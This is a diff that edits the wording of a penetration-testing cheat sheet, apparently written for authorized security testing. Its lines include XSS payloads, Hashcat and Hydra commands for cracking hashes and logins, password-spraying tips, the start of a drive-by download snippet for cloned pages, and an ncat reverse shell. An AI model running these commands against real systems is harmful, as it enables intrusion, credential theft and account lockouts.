@@ -294,7 +294,7 @@ Search the Internet for default / pre-defined paths and files for a specific web
 
 You can find the application's source code on [GitHub](https://github.com), [GitLab](https://about.gitlab.com), [searchcode](https://searchcode.com), etc.
 
-Search the application's source code for API keys, credentials, secrets, tokens, hosts, etc., with [TruffleHog](#trufflehog) or [File Scraper](#file-scraper). Don't forget to check old GitHub commits for old but still active API keys, credentials, secrets, tokens, etc.
+Search the application's source code for API keys, credentials, secrets, tokens, hosts, etc., with [TruffleHog](#trufflehog) and [File Scraper](#file-scraper). Don't forget to check old GitHub commits for old but still active API keys, credentials, secrets, tokens, etc.
 
 Inspect the web console for possible errors. Inspect the application's source code for possible comments.
 
@@ -535,7 +535,7 @@ fierce -file fierce_std_results.txt --domain somedomain.com
 fierce -file fierce_brt_results.txt --subdomain-file subdomains-top1mil.txt --domain somedomain.com
 ```
 
-**By default, Fierce will perform brute force attack with its built-in wordlist.**
+**By default, Fierce will perform dictionary attack with its built-in wordlist.**
 
 ### DNSRecon
 
@@ -549,7 +549,7 @@ dnsrecon -t axfr --json /root/Desktop/dnsrecon_axfr_results.json -d somedomain.c
 dnsrecon -v --iw -f --lifetime 3 --threads 50 -t brt --json /root/Desktop/dnsrecon_brt_results.json -D subdomains-top1mil.txt -d somedomain.com
 ```
 
-DNSRecon can perform a brute force attack with a user-defined wordlist, but make sure to specify a full path to the wordlist; otherwise, DNSRecon might not recognize it.
+DNSRecon can perform a dictionary attack with a user-defined wordlist, but make sure to specify a full path to the wordlist; otherwise, DNSRecon might not recognize it.
 
 Make sure to specify a full path to the output file; otherwise, it will default to `/usr/share/dnsrecon/` directory, i.e., to the root directory.
 
@@ -920,7 +920,7 @@ playwright install chromium
 
 More about my project at [ivan-sincek/scrapy-scraper](https://github.com/ivan-sincek/scrapy-scraper).
 
-Scrape the JavaScript files using [TruffleHog](#trufflehog) or [File Scraper](#file-scraper).
+Scrape the JavaScript files using [TruffleHog](#trufflehog) and [File Scraper](#file-scraper).
 
 ### Directory Fuzzing
 
@@ -1223,7 +1223,7 @@ Try to manipulate cookies or JWT tokens to gain access or elevate privileges. On
 
 Always inspect web browser's local storage, especially if testing a single-page application (SPA).
 
-Try to transform, e.g., an HTTP POST request into an HTTP GET request, i.e., into a query string, and see if a server will accept it.
+Try to transform, e.g., an HTTP POST request into an HTTP GET request, i.e., into a query string, and see how a server will react to it.
 
 Turn off JavaScript in your web browser and check the web application behaviour again.
 
@@ -1439,7 +1439,7 @@ email=victim%40gmail.com&email=hacker%40gmail.com
 email[]=victim%40gmail.com&email[]=hacker%40gmail.com
 ```
 
-To generate the above output, run [idor.py]():
+To generate the above output, run [idor.py](https://github.com/ivan-sincek/penetration-testing-cheat-sheet/blob/master/scripts/idor.py):
 
 ```fundamental
 python3 idor.py -n email -i victim@gmail.com -t hacker@gmail.com
@@ -1477,7 +1477,7 @@ Simple cross-site scripting (XSS) payloads:
 <img src="https://github.com/favicon.ico" onload="alert(1)">
 ```
 
-Hosting JavaScript on [Pastebin](https://pastebin.com) doesn't work because Pastebin returns `text/plain` content-type.
+Hosting JavaScript on [Pastebin](https://pastebin.com) won't work because Pastebin always returns `text/plain` content-type.
 
 Find out more about reflected and stored cross-site scripting (XSS) attacks, as well as cross-site request forgery (XSRF/CSRF) attacks at [ivan-sincek/xss-catcher](https://github.com/ivan-sincek/xss-catcher).
 
@@ -1493,9 +1493,9 @@ user@somedomain(<script>alert(1)</script>).com
 
 ### SQL Injection
 
-**The following payloads were tested on MySQL database. Note that MySQL requires a white space between the comment symbol and the next character.**
+**The following payloads were tested on MySQL database. Note that MySQL requires a whitespace character between the comment symbol and the next character.**
 
-If you need to URL encode the whitespace, use either `%20` or `+`.
+If you need to URL encode the whitespace character, use `%20` or `+` instead.
 
 Try to produce database errors by injecting a single-quote, back-slash, double-hyphen, forward-slash, or period.
 
@@ -1533,9 +1533,9 @@ If using, e.g., `1,2,3,4` does not work, try using `NULL,NULL,NULL,NULL` respect
 
 Use the union-based SQLi only when you are able to use the same communication channel to both launch the attack and gather results.
 
-The goal is to determine the exact number of columns in the application query and to figure out which of them are displaying to the user.
+The goal is to determine the exact number of columns in the SQL query and to figure out which of them are shown back to the user.
 
-Another way to determine the exact number of columns is by using, e.g., `' ORDER BY 1-- `, where `1` is the column number used for sorting - try incrementing it by one.
+Another way to determine the exact number of columns is by using, e.g., `' ORDER BY 1-- `, where `1` is the column number used for sorting - incrementing it by one on each try.
 
 ---
 
@@ -1751,13 +1751,13 @@ Find out more about PowerShell reverse and bind TCP shells at [ivan-sincek/power
 
 **Google a hash before trying to crack it because you might save yourself a lot of time and trouble.**
 
-Use [Google Dorks](#google-dorks), [Chad](#chad), or [FOCA](#foca) to find and download files, and within file's metadata, domain usernames to brute force.
+Use [Google Dorks](#google-dorks), [Chad](#chad), or [FOCA](#foca) to find and download files, and within the files' metadata, domain usernames to brute force.
 
 **Keep in mind that you might lockout people's accounts.**
 
-Keep in mind that some web forms implement CAPTCHA and/or hidden submission tokens which may prevent you from brute forcing. Try to submit requests without tokens or CAPTCHA.
+Some web forms have CAPTCHA challenge and/or hidden submission token which may prevent you from brute forcing. If that is the case, try to submit a request without the CAPTCHA challenge response and submission token.
 
-You can find a bunch of wordlists in [SecLists](#wordlists).
+You can find a bunch of useful wordlists in [SecLists](#wordlists).
 
 ### 5.1 Useful Websites
 
@@ -1922,7 +1922,7 @@ hashcat -m 5600 -a 0 --session=cracking --force --status -O -o hashcat_results.t
 
 You can find `rockyou.txt` wordlist in [SecLists](#wordlists).
 
-Brute force a hash using a  placeholder:
+Brute force a hash using a placeholder:
 
 ```fundamental
 hashcat -m 0 -a 3 --session=cracking --force --status -O cc158fa2f16206c8bd2c750002536211 -1 ?l?u -2 ?d?s ?1?l?l?l?l?l?2?2
@@ -1938,27 +1938,27 @@ Dictionary attack:
 hashcat -m 16500 -a 3 --session=cracking --force --status -O eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds
 ```
 
-You can also check my JWT cracking tool [here](https://github.com/ivan-sincek/jwt-bf).
+You can also check my JWT cracking tool at [ivan-sincek/jwt-bf](https://github.com/ivan-sincek/jwt-bf).
 
 ### Hydra
 
-Crack an HTTP POST web form login:
+I prefer to use Burp Suite to brute force web forms, and Hydra for other services.
+
+Dictionary attack on an HTTP POST login web form:
 
 ```fundamental
 hydra -o hydra_results.txt -l admin -P rockyou.txt somesite.com http-post-form '/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed!'
 ```
 
-When cracking a web form login, you must specify `Login=Login:<expected_message>` to distinguish between a successful login and a failed one. Each expected message can vary between web forms.
+When brute forcing a login web form, you must specify `Login=Login:<expected_message>` to distinguish between the successful and failed login attempts. Change the `username` and `password` request parameter names as necessary.
 
-Keep in mind that the `username` and `password` request parameters can be named differently.
-
-Crack a Secure Shell (SSH) login:
+Dictionary attack on a Secure Shell (SSH) login:
 
 ```fundamental
 hydra -o hydra_results.txt -L users.txt -P rockyou.txt 192.168.8.5 ssh
 ```
 
-You can find a bunch of wordlists in [SecLists](#wordlists).
+You can find a bunch of useful wordlists in [SecLists](#wordlists).
 
 | Option | Description |
 | --- | --- |
@@ -1997,7 +1997,7 @@ For more supported services read the manual.
 | MAX | Maximum number of characters in the password |
 | CHARSET | Charset values are: "a" for lowercase letters, "A" for uppercase letters, "1" for numbers, and for all others, just add their real representation |
 
-Brute force attack:
+Brute force attack on FTP:
 
 ```fundamental
 hydra -o hydra_results.txt -l admin -x 4:4:aA1\!\"\#\$\% 192.168.8.5 ftp
@@ -2005,17 +2005,17 @@ hydra -o hydra_results.txt -l admin -x 4:4:aA1\!\"\#\$\% 192.168.8.5 ftp
 
 ### Password Spraying
 
-After you have collected enough usernames from [reconnaissance phase](#1-reconnaissance), it is time to try and crack some of them.
+After you have collected enough usernames from the [reconnaissance phase](#1-reconnaissance), it is time to try and brute force some of them.
 
 Find out how to generate a good password spraying wordlist at [ivan-sincek/wordlist-extender](https://github.com/ivan-sincek/wordlist-extender), but first you will need a few good keywords that describe your target.
 
-Such keywords can be a company name, abbreviations, words that describe your target's services, products, etc.
+Such keywords can include a company name, abbreviations, or words that describe the company's services, products, etc.
 
-After you generate the wordlist, use it with tools such as [Hydra](#hydra), [Burp Suite Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder/using), etc., to crack web login forms. P.S. Hydra can attack authentication mechanisms on all kinds of services/ports.
+After you generated the wordlist, use it with tools such as [Hydra](#hydra), [Burp Suite Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder), etc., to brute force login web forms. Hydra can attack authentication mechanisms for all kinds of services and ports.
 
-If strong password policy is enforced, passwords usually start with one capitalized word followed by a few digits and one special character at the end (e.g., Password123!).
+If strong password policy is enforced, lazy passwords usually start with one capitalized word followed by a few digits and one special character at the end (e.g., Password123!).
 
-You can also use the generated wordlist with [hashcat](#hashcat), e.g., to crack NTLMv2 hashes that you have collected using LLMNR responder, etc.
+You can also use the generated wordlist with [hashcat](#hashcat), e.g., to crack NTLMv2 hashes that you have collected using LLMNR responder during a network penetration testing, etc.
 
 ## 6. Social Engineering
 
@@ -2023,7 +2023,7 @@ Find out how to embed a PowerShell script into an MS Word document at [ivan-sinc
 
 ### Drive-by Download
 
-To force users to download a malicious file, copy and paste this JavaScript code block on a cloned web page:
+To force users to download a malicious file, copy and paste this JavaScript code block on any cloned web page:
 
 ```javascript
 function download(url, type, name, method) {
@@ -2106,8 +2106,6 @@ Upload a file:
 curl somesite.com/uploads/ -T somefile.txt
 ```
 
-Find out how to test a web server for various HTTP methods and method overrides at [ivan-sincek/forbidden](https://github.com/ivan-sincek/forbidden).
-
 | Option | Description |
 | --- | --- |
 | -d | Sends the specified data in a POST request to the HTTP server |
@@ -2119,6 +2117,8 @@ Find out how to test a web server for various HTTP methods and method overrides 
 | -v | Make the operation more talkative |
 | -x | Use the specified proxy (\[protocol://\]host\[:port\]) |
 | -X | Specifies a custom request method to use when communicating with the HTTP server |
+
+Find out how to test a web server for various HTTP methods and method overrides at [ivan-sincek/forbidden](https://github.com/ivan-sincek/forbidden).
 
 ### Ncat
 
@@ -2152,6 +2152,8 @@ ncat -nv 192.168.8.5 9000 -e /bin/bash --ssl
 ncat -nv 192.168.8.5 9000 --ssl-cert crt.pem --ssl-key key.pem
 ```
 
+Find out how to create an SSL/TLS certificate at [ivan-sincek/secure-website](https://github.com/ivan-sincek/secure-website/tree/master/crt).
+
 Check if connection to a specified TCP port (e.g., port 22 or 23) is possible:
 
 ```bash
@@ -2159,8 +2161,6 @@ for i in {0..255}; do ncat -nv "192.168.8.${i}" 9000 -w 2 -z 2>&1 | grep -Po '(?
 
 for ip in $(cat ips.txt); do ncat -nv "${ip}" 9000 -w 2 -z 2>&1 | grep -Po '(?<=Connected\ to\ )[^\s]+(?=\.)'; done
 ```
-
-Find out how to create an SSL/TLS certificate at [ivan-sincek/secure-website](https://github.com/ivan-sincek/secure-website/tree/master/crt).
 
 ### multi/handler
 
